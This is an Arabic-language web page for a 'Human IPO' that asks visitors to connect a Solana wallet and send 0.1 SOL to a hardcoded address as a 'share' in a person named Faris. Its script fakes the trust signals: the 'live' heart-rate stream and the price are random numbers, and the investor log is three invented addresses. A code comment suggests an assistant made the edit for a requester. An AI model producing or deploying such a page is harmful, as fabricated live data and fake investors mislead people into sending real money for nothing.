<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>THE HUMAN IPO | FARIS</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Cairo:wght@300;700&display=swap');
        :root { --neon: #39FF14; --dark: #020202; }
        body { background: var(--dark); color: var(--neon); font-family: 'Cairo', sans-serif; }
        .cyber-panel { border: 1px solid var(--neon); background: rgba(0,0,0,0.9); box-shadow: 0 0 20px rgba(57, 255, 20, 0.1); }
        .glitch-font { font-family: 'Orbitron', sans-serif; }
        .pulse { animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
    </style>
</head>
<body class="p-4 md:p-10">

    <div class="max-w-6xl mx-auto">
        <header class="flex justify-between items-center mb-10 p-6 cyber-panel rounded-lg">
            <div>
                <h1 class="glitch-font text-3xl font-black">HUMAN IPO <span class="text-xs text-white">FARIS_v1</span></h1>
                <div class="text-[10px] text-gray-400">STATUS: <span class="text-green-500">BIO-DATA SYNC ACTIVE</span></div>
            </div>
            <button id="connectBtn" onclick="connectWallet()" class="border border-[#39FF14] px-6 py-2 hover:bg-[#39FF14] hover:text-black transition-all font-bold text-xs">
                CONNECT WALLET
            </button>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div class="cyber-panel p-6 rounded-lg text-center">
                <div class="mb-6">
                    <div class="text-[10px] text-gray-500 mb-2 uppercase">الحالة الحيوية الحالية</div>
                    <div class="text-6xl font-black glitch-font mb-2" id="bpmDisplay">--</div>
                    <div class="text-xs text-green-400 pulse">● STREAMING LIVE FROM FARIS</div>
                </div>
                <div class="space-y-4 text-right border-t border-green-900 pt-6">
                    <div class="flex justify-between"><span>سعر الحصة</span> <span class="text-yellow-400 font-mono">0.1 SOL</span></div>
                    <div class="flex justify-between"><span>القيمة التقديرية</span> <span class="text-white font-mono" id="priceDisplay">$412.00</span></div>
                </div>
                <button onclick="buyToken()" class="w-full mt-8 bg-[#39FF14] text-black font-black py-4 hover:shadow-[0_0_30px_#39FF14] transition-all uppercase">
                    استثمر في فارس الآن
                </button>
            </div>

            <div class="lg:col-span-2 space-y-6">
                <div class="cyber-panel p-6 rounded-lg">
                    <h2 class="glitch-font text-sm mb-4 border-b border-green-900 pb-2">سجل التحويلات الحية</h2>
                    <div id="investorList" class="space-y-3 text-[10px] font-mono">
                        </div>
                </div>
                <div class="cyber-panel p-6 rounded-lg h-40 flex items-end gap-1">
                    <div class="bg-green-500/20 w-full" style="height: 40%"></div>
                    <div class="bg-green-500/40 w-full" style="height: 65%"></div>
                    <div class="bg-green-500/60 w-full" style="height: 45%"></div>
                    <div class="bg-green-500/80 w-full" style="height: 85%"></div>
                    <div class="bg-green-500 w-full pulse" style="height: 70%"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // التعديل الذي طلبته: وضع عنوانك بشكل صحيح برمجياً
        const MY_WALLET_ADDRESS = "2goW6zAeC9qQVAudMYCmQ4Pdfa3KRhme6b82UFC7wbzf";
        let userWallet = null;

        async function connectWallet() {
            if (window.solana) {
                try {
                    const resp = await window.solana.connect();
                    userWallet = resp.publicKey;
                    document.getElementById('connectBtn').innerText = userWallet.toString().slice(0,6) + "...";
                    document.getElementById('connectBtn').style.background = "#39FF14";
                    document.getElementById('connectBtn').style.color = "black";
                } catch (e) { alert("رفض المستخدم الاتصال"); }
            } else { alert("يرجى فتح الموقع من متصفح تطبيق Phantom"); }
        }

        async function buyToken() {
            if (!userWallet) return alert("يرجى ربط المحفظة أولاً");
            
            try {
                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userWallet,
                        toPubkey: new solanaWeb3.PublicKey(MY_WALLET_ADDRESS),
                        lamports: 0.1 * solanaWeb3.LAMPORTS_PER_SOL 
                    })
                );

                const { blockhash } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = userWallet;

                const signed = await window.solana.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signed.serialize());
                alert("تمت المعاملة بنجاح! شكراً لدعمك. رقم العملية: " + signature);
            } catch (e) { 
                console.error(e);
                alert("فشلت العملية: تأكد من وجود رصيد كافٍ (0.1 SOL + الرسوم)"); 
            }
        }

        function updateStats() {
            document.getElementById('bpmDisplay').innerText = 65 + Math.floor(Math.random() * 20);
            document.getElementById('priceDisplay').innerText = "$" + (410 + Math.random() * 10).toFixed(2);
        }

        const investors = ["7xR4...kL", "3mN2...qP", "9pZ1...vX"];
        function renderInvestors() {
            document.getElementById('investorList').innerHTML = investors.map(inv => `
                <div class="flex justify-between border-b border-gray-900 pb-1">
                    <span>${inv} اشترى 1 حصة</span>
                    <span class="text-green-500">+0.1 SOL</span>
                </div>
            `).join('');
        }

        setInterval(updateStats, 2500);
        updateStats();
        renderInvestors();
    </script>
</body>
</html>
